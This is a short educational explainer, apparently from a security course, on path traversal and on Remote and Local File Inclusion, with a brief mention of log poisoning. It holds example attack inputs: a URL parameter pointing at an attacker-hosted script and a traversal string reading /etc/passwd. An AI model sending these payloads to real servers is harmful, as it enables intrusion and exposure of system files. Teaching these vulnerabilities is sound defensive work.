# Basics of File Inclusion

A traversal string, commonly seen as `../`, is used in path traversal attacks to navigate through the directory structure of a file system. It's essentially a way to move up one directory level. Traversal strings are used to access files outside the intended directory.

Relative pathing refers to locating files based on the current directory. For example, `include('./folder/file.php')` implies that `file.php` is located inside a folder named `folder`, which is in the same directory as the executing script.

Absolute pathing involves specifying the complete path starting from the root directory. For example, `/var/www/html/folder/file.php` is an absolute path.

## Remote File Inclusion

Remote File Inclusion (RFI) is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like `include.php?page=http://attacker.com/exploit.php`, an attacker can replace the URL with a path to a malicious script.

## Local File Inclusion

Local File Inclusion (LFI) typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like `include.php?page=../../../../etc/passwd`.

While LFI primarily leads to unauthorized file access, it can escalate to Remote Code Execution (RCE). This can occur if the attacker can upload or inject executable code into a file that is later included or executed by the server. Techniques such as log poisoning, which means injecting code into log files and then including those log files, are examples of how LFI can lead to RCE.

## RFI vs LFI Exploitation Process

This diagram above differentiates the process of exploiting RFI and LFI vulnerabilities. In RFI, the focus is on including and executing a remote file, whereas, in LFI, the attacker aims to access local files and potentially leverage this access to execute code on the server.
